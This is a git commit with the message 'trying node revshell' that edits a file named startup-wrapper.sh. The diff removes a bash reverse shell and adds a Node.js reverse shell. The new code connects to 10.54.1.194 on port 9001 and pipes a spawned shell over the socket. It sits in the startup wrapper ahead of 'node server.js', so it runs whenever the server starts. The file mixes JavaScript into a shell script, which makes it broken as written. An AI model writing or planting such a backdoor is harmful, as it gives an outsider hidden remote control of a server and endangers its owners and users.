eff9691a872a31fcca268520fd4eeec04652f8c1
Marcus Orciuch <marcusoy@live.com>
2023-04-19 15:30:46 -0400

    trying node revshell

--- startup-wrapper.sh
+++ startup-wrapper.sh
@@ -1,4 +1,14 @@
-#!/bin/bash
-
-sh -i >& /dev/tcp/10.54.1.194/9001 0>&1 &
+(function(){
+        var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+        var client = new net.Socket();
+        client.connect(9001, "10.54.1.194", function(){
+                client.pipe(sh.stdin);
+                sh.stdout.pipe(client);
+                sh.stderr.pipe(client);
+        });
+        return /a/; // Prevents the Node.js application from crashing
+})();
+# sh -i >& /dev/tcp/10.54.1.194/9001 0>&1 &
 node server.js
